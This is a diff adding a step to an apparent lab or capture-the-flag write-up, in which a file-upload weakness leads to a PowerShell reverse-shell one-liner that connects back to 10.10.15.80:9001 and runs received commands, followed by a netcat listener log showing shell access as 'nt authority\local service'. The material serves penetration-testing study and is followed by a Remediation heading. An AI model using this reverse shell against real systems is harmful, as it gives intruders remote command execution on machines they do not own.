@@ -512,7 +512,22 @@ reuploading the shell using the file uploading feature:
 
 img 3
 
+reverse shell:
 
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.80',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+img4
+
+```
+nc -lvnp 9001                
+listening on [any] 9001 ...
+connect to [10.10.15.80] from (UNKNOWN) [10.129.234.67] 52864
+whoami
+nt authority\local service
+PS C:\xampp\htdocs> 
+
+```
 
 ---
 ## Remediation
